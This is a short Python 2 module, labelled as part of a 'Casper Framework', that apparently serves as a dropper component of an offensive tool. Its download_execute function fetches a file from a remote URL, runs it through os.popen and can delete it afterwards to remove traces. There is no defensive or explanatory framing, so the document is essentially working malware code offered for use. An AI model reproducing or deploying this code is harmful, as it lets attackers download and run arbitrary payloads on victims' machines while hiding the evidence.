"""
Part of Casper Framework
"""
from imports import *

def execute(file):
	"""
	create a process and return True if success
	else False
	"""
	try:
		process_create = os.popen(file)
		process_result = process_create.read()
		return True
	except Exception as e:
		return False

def download(url,file):
	"""
	download a file to disk
	"""
	try:
		urllib.urlretrieve(url,file)
		return True
	except Exception as e:
		return False

def autodelete(file):
	"""
	delete the file after execution
	"""
	try:
		os.remove(file)
		return True
	except Exception as e:
		return False

def download_execute(url,file,autod):
	"""
	download execute function, autod 0 will not delete
	file execution
	"""
	if (download(url,file) == True):
		logging.debug("[casper] Successfully downloaded file")
		if (execute(file) == True):
			logging.debug("[casper] Successfully executed file")
			if (autod == 1):
				if (autodelete(file) == True):
					logging.debug("[casper] Successfully deleted the file")
				else:
					logging.debug("[casper] Unable to delete the file")
			else:
				pass
		else:
			logging.debug("[casper] Unable to execute file")
	else:
		logging.debug("[casper] Unable to download file")
	return True